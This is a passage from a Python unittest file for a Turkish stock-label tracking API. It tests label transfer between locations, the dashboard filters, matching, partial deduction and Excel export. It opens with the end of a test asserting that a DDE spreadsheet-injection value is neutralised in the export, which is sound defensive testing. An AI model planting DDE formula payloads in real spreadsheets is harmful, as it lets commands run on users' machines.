            dde_xlsx = resp_dde.read()
        wb_dde = openpyxl.load_workbook(io.BytesIO(dde_xlsx))
        cell_val = wb_dde["Stok Etiketleri"]["G2"].value
        self.assertTrue(cell_val.startswith("'[METİN]"), f"DDE not neutralized: {cell_val}")
        self.assertNotIn("|", cell_val)

    def test_17_scan_transfer_and_status_lifecycle(self):
        import io
        import openpyxl

        item = self._track_create(
            {
                "reference": "TEST-TRANSFER-FLOW",
                "quantity": 25,
                "level": "1AD P02",
                "created_by": "Seval",
            }
        )
        self.assertEqual(item["status"], "IN_STOCK")
        self.assertIsNone(item.get("transferred_to"))

        # 1) Etiketi okutarak 'Paketleme Hat-1' konumuna transfer et
        st_tr, _, tr_item = api_call(
            "POST",
            "/api/stock/scan-transfer",
            {
                "qr_or_code": item["qr_payload"],
                "target_location": "paketleme hat-1",
                "note": "Sabah vardiyası",
            },
        )
        self.assertEqual(st_tr, 200)
        self.assertEqual(tr_item["status"], "TRANSFERRED")
        self.assertEqual(tr_item["transferred_to"], "PAKETLEME HAT-1")
        self.assertIsNotNone(tr_item["transferred_at"])
        self.assertEqual(tr_item["movements"][0]["action"], "TRANSFERRED")

        # 2) Dashboard'da TRANSFERRED filtresinde ve transfer yeri aramasında görünmeli
        st_dash, _, dash = api_call(
            "GET",
            "/api/stock/dashboard?status=TRANSFERRED&q=PAKETLEME%20HAT-1",
        )
        self.assertEqual(st_dash, 200)
        self.assertGreaterEqual(dash["summary"]["transferred_label_count"], 1)
        self.assertTrue(any(x["id"] == item["id"] for x in dash["items"]))

        # 3) Üretim eşleştirmede (match) transferdeki ürün de aktif stok olarak yakalanmalı
        _, _, matched = api_call(
            "POST",
            "/api/stock/match",
            {"queries": [{"reference": "TEST-TRANSFER-FLOW", "level": "1AD P02"}]},
        )
        self.assertEqual(matched[0]["total_exact_quantity"], 25)
        self.assertEqual(matched[0]["exact_level_matches"][0]["transferred_to"], "PAKETLEME HAT-1")

        # 4) Excel aktarımında durum 'Transfer: PAKETLEME HAT-1' olarak geçmeli ve güvenlik taramasından geçmeli
        req_xl = urllib.request.Request(
            f"{BASE_URL}/api/stock/export.xlsx?status=TRANSFERRED&q={item['label_code']}",
            headers={"X-Safe-Browser-Token": SAFE_TOKEN},
        )
        with urllib.request.urlopen(req_xl, timeout=10) as resp_xl:
            self.assertEqual(resp_xl.headers.get("X-Scan-Verdict"), "CLEAN-OOXML")
            wb = openpyxl.load_workbook(io.BytesIO(resp_xl.read()))
            self.assertEqual(wb["Stok Etiketleri"]["F2"].value, "Transfer: PAKETLEME HAT-1")

        # 5) Transferdeyken kısmi düşüm yapıldığında kalan adet aynı transfer yerinde kalmalı
        st_part, _, part_item = api_call(
            "POST",
            "/api/stock/scan-deduct",
            {"qr_or_code": item["label_code"], "deduct_quantity": 10},
        )
        self.assertEqual(st_part, 200)
        self.assertEqual(part_item["remaining_quantity"], 15)
        self.assertEqual(part_item["status"], "TRANSFERRED")
        self.assertEqual(part_item["transferred_to"], "PAKETLEME HAT-1")

        # 6) 'DEPO' hedefine okutulduğunda tekrar 'IN_STOCK' (Depoda) durumuna dönmeli
        st_ret, _, ret_item = api_call(
            "POST",
            "/api/stock/scan-transfer",
            {"qr_or_code": item["label_code"], "target_location": "DEPO"},
        )
        self.assertEqual(st_ret, 200)
        self.assertEqual(ret_item["status"], "IN_STOCK")
        self.assertIsNone(ret_item["transferred_to"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
